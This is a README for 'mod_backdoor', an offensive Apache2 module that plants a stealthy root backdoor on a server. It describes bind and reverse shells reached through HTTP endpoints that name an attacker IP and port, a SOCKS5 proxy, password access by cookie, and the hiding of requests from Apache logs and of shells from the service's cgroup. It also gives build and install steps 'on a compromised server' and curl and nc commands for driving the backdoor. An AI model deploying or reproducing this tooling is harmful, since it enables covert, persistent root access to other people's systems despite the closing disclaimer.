# Apache2 mod_backdoor

mod_backdoor is a stealth backdoor using an Apache2 module.<br/>
The main idea is to fork() the primary Apache2 process just after it has loaded its config.
Since it's forked before the root user transfers the process to www-data, you can execute command as root.<br/>
As Apache2 loads its configuration only when you (re)start it, the challenge was to never let die this 
forked root apache2 process, to let us interact as root with the compromised system.

# Features

* Bind TTY Shell
* Reverse Shell (TTY , Native, PHP, Perl, Python, Ruby)
* High stability and reliability, each shell spawns 
a new forked independent root process **attached to PID 1** and **removed from apache2 cgroup**
* Socks5 proxy
* Password Protection through cookie headers
* Ping module to know if its still active
* Bypass logging mechanism. Each request to the backdoor module **are not logged** by Apache2.
* Work on systemd systems, but should also work with init-like systems

# Demo
[![asciicast](https://asciinema.org/a/289452.svg)](https://asciinema.org/a/289452)
# Description

* The password is send through Cookie headers: `Cookie: password=backdoor`. It's defined with `#define` 
in the beginning of mod_backdoor.c, so you could easily edit it.<br/>

* Each following requests must contain this password to interact with the module.<br/>
* Each request containing this cookie **will not be logged by Apache** if the module is running. <br/>

* Each shell spawns **attached to PID** 1 and **is removed from apache2 cgroup**.
 It means it's possible to **restart/stop apache2.service from a spawned shell** (not true for 
 TTY shells because an apache2 process is needed to do the bidirectional communication between socket
 and pty). It also improves stealth, shells are no longer related to apache2.service. <br/>
 * IPC socket is stored in the private /tmp folder provided by systemd service. 
 On non-systemd systems, I'm currently working on how to implement a stealth behavior for the socket.

### Bind TTY Shell
The endpoint  `http[s]://<TARGET>/bind/<PORT>` binds a listening port on `<TARGET>:<PORT>` <br/>
When a connection is initiated to the listening port, the port closes. <br/>
`forkpty()` is used to obtain a native TTY shell, working with an IPC UNIX socket to communicate 
between forked TTY process and the new socket you just opened.<br/>
Shells could be easily upgraded with the famous trick:<br/>
 `CTRL-Z --> stty raw -echo --> fg --> reset`

### Reverse TTY Shell
It works like the bind shell, the endpoint `http[s]://<TARGET>/revtty/<IP>/<PORT>` returns a TTY
shell to `<IP>:<PORT>` <br/>


### Reverse Shell (No TTY)
The endpoint `http[s]://<TARGET>/reverse/<IP>/<PORT>/<PROG>` returns a shell to `<IP>:<PORT>`. <br/>
`<PROG>` must be one of these: <br/>
<p align="center">

| Native   | External  |    
| :------: | :--------:|
|   sh     |    php    |
|   bash   |    python |
|   dash   |    ruby   |
|   ash    |    perl   |
|   tcsh   |           |
|   ksh    |           |

</p>

`<PROG>` must be in lower-case.<br/>
PHP uses the `exec` function.<br/>
Ruby isn't using `/bin/sh`.

### Socks5 proxy
Source code comes from https://github.com/rofl0r/microsocks <br/>
The endpoint `http[s]://<TARGET>/proxy/<PORT>/<USER>` opens a socks5 proxy on `<PORT>`. 
`<USER>` is optional. If you set it, it activates the auth mode. Password is the same as the mod_backdoor.<br/>
Once a specific ip address authed successfully with `user:pass`, it is added to a whitelist and may use the proxy without auth. 
This is handy for programs like firefox that don't support `user:pass` auth.<br/>
For it to work you'd basically make one connection with another program that supports it, and then you can use firefox too.<br/>
Example:<br/>
1. `curl -H 'Cookie: password=backdoor' http://<TARGET>/proxy/1337/vlad` <br/>
--> Start socks proxy on port 1337 for `vlad` user 
2. `curl -x socks5://vlad:password=backdoor@<TARGET>:1337 https://www.google.com` <br/>
--> Register your IP address
3. You could now use it without auth
4. When you're done, you can kill the socks proxy by sending `imdonewithyou` in a socket <br/>
--> `echo "imdonewithyou" | nc <TARGET> 1337`

### Ping module
The endpoint `http[s]://<TARGET>/ping` tells you if the module is currently working.

# Notes
Apache2 Module Backdoor is inspired from Ringbuilder, created by Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/TheXC3LL))<br/>
More info about Ringbuilder:<br/>
https://github.com/TarlogicSecurity/mod_ringbuilder <br/>
https://www.tarlogic.com/en/blog/backdoors-modulos-apache/ <br/>

Socks5 code was adapted from https://github.com/rofl0r/microsocks <br/>
<br/>
Special thanks to [@Ug_0Security](https://twitter.com/Ug_0Security)

# Builds
For development :<br/>
* `apxs -i -a -c mod_backdoor.c sblist.c sblist_delete.c server.c -Wl,-lutil` <br/>
 `-Wl,-lutil` used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
* `systemctl restart apache2`

On a compromised server :<br/>
* Compile it for the desired arch and retrieve the mod_backdoor.so or<br/>
get it from the `build/` folder (compiled for: Apache/2.4.41 (Debian)).
* Copy mod_backdoor.so to `/usr/lib/apache2/modules/mod_backdoor.so`
* Copy backdoor.load to `/etc/apache2/mod-available/backdoor.load`
* `a2enmod backdoor` --> `systemctl restart apache2`

# Author
Vlad Rico ([@RicoVlad](https://twitter.com/RicoVlad))

## Disclaimer
This project was created only for learning purpose.<br/>
Usage of mod_backdoor for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws. 
Developers assume no liability and are not responsible for any misuse or damage caused by this program.
